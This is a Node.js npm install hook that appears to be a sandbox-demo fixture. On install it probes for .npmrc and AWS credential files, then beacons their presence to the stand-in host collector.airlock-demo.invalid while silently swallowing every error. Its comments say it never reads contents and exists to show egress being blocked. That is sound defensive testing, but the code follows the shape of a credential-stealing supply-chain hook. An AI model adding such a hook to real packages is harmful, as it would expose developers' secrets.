'use strict';

/**
 * Install-time hook for the sandboxing test fixture.
 *
 * Deliberately SAFE variant:
 *   - It probes for the existence of two well-known credential files so the
 *     sandbox can demonstrate that the read was attempted/observed.
 *   - It does NOT read, transmit, or persist the contents of those files.
 *   - The outbound request carries a fixed marker payload only, so a demo can
 *     show egress being blocked/intercepted without this ever being a working
 *     credential-stealing payload outside the demo VM.
 *   - It never throws and never exits non-zero, so `npm install` succeeds.
 */

var fs = require('fs');
var os = require('os');
var path = require('path');
var https = require('https');

var ENDPOINT_HOST = 'collector.airlock-demo.invalid';
var ENDPOINT_PATH = '/upload';
var TIMEOUT_MS = 5000;

function probe(name) {
  // Existence check only. Contents are never read.
  try {
    fs.accessSync(path.join(os.homedir(), name), fs.constants.F_OK);
    return { path: name, present: true };
  } catch (e) {
    return { path: name, present: false };
  }
}

function writeAttemptLog(report) {
  try {
    var file = path.join(os.tmpdir(), 'left-padder-install-attempt.json');
    fs.writeFileSync(file, JSON.stringify(report, null, 2), 'utf8');
  } catch (e) {
    // ignore
  }
}

function send(report, done) {
  var body = Buffer.from(
    JSON.stringify({
      event: 'sandbox-demo-beacon',
      package: 'left-padder',
      version: '1.4.3',
      // Metadata only: which paths were probed and whether they exist.
      // No file contents are included, by design.
      probes: report.probes
    }),
    'utf8'
  );

  var req;
  try {
    req = https.request(
      {
        host: ENDPOINT_HOST,
        port: 443,
        path: ENDPOINT_PATH,
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'content-length': body.length
        },
        timeout: TIMEOUT_MS
      },
      function (res) {
        res.resume();
        res.on('end', function () {
          done(null);
        });
      }
    );
  } catch (e) {
    done(e);
    return;
  }

  req.on('timeout', function () {
    try {
      req.destroy(new Error('timeout'));
    } catch (e) {
      // ignore
    }
  });

  req.on('error', function (err) {
    done(err);
  });

  try {
    req.write(body);
    req.end();
  } catch (e) {
    done(e);
  }
}

function main() {
  var report = {
    at: new Date().toISOString(),
    probes: [probe('.npmrc'), probe(path.join('.aws', 'credentials'))],
    delivery: 'pending'
  };

  writeAttemptLog(report);

  send(report, function (err) {
    report.delivery = err ? 'failed: ' + (err && err.message) : 'ok';
    writeAttemptLog(report);
  });
}

// Belt and braces: nothing in here may ever fail the install.
process.on('uncaughtException', function () { /* swallow */ });
process.on('unhandledRejection', function () { /* swallow */ });

try {
  main();
} catch (e) {
  // ignore
}
